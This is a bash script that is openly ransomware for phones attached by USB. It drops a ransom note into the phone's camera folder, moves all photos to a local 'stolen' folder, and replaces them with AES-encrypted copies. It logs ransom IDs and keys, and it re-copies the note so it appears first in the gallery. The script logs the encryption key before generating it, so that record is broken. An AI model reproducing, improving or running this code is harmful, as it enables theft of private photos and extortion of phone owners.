#!/bin/bash
###############This script will encrypt pictures taken by a phone's camera while it is plugged in. Additionally, pictures are saved locally in data/stolen.####################################
oldusblist=$(lsusb)
"./wait-for-phone.sh"
LOCALPATH=$(pwd)
PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/Camera)
echo $PHONEPATH

#######################################################################Here we are dropping ransom note##########################################################################
ransomid=$(openssl rand 16 -hex)
echo "Now Dropping note..."
gvfs-copy "warningpicture/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png"
echo "The Note dropped as ransom_$ransomid.png"
echo ""

#Here we are keeping a pair of ransomid and encryption keys
echo `date --rfc-3339=seconds` "|" $ransomid "|" $enc_fundamental >> fundamentals/fundamentals.txt 

####################################################Make a folder to keep the files that have been taken. Named the folder as serial number and currenttime of the device#######################################
cd data/stolen
deviceinformation=$(lsusb | grep -v "$oldusblist")
devicebus=$(echo $deviceinformation | awk -F' |: ' '/Device /{gsub(" "," ");print $2}')
numberofthedevice=$(echo $deviceinformation | awk -F' |: ' '/Device /{gsub(" "," ");print $4}')

DEVICEID=$(udevadm info --name=/dev/bus/usb/$devicebus/$numberofthedevice | awk -F'=' '/ID_SERIAL=/{gsub("_"," ");print $2}')

currenttime=$(date)
TRANSDIR="$DEVICEID $currenttime"
mkdir "$TRANSDIR"

#each file to be sent and encrypted
enc_fundamental=$(openssl rand 16 -hex)

cd "$PHONEPATH"

newfile=1
filecounter=$(ls -1 | grep -v "ransom" | grep -v ".enc.jpg" | wc -l)

for f in *
do 
	
	if [[ $f != "ransom"* ]] && [[ $f != *".enc.jpg" ]]; then #This line encrypt all files that haven't been encrypted already, as well as the ransom note.
		echo "Now transferring and encrypting $f ($newfile/$filecounter)..."
		gvfs-move "$f" "$LOCALPATH/data/stolen/$TRANSDIR"
		openssl aes-256-cbc -a -salt -in "$LOCALPATH/data/stolen/$TRANSDIR/$f" -out "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" -k $enc_fundamental
		touch -r "$LOCALPATH/data/stolen/$TRANSDIR/$f" "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" #Provide the new encrypted file the same currenttime as the old file
		gvfs-move "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" .	
		
		newfile=$((newfile+1))
	fi

done

#Re-copy the note so that it appears first in the gallery.
cd "$LOCALPATH"
sleep 1
gvfs-copy "warningpicture/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png" 



#Last step
echo ""
echo YEY Encryption complete. check fundamentals/fundamentals.txt for ransom id and fundamental
echo Transferred photos stored in "data/stolen/$TRANSDIR"
echo ""
##########################################################################################THE END#################################################################################
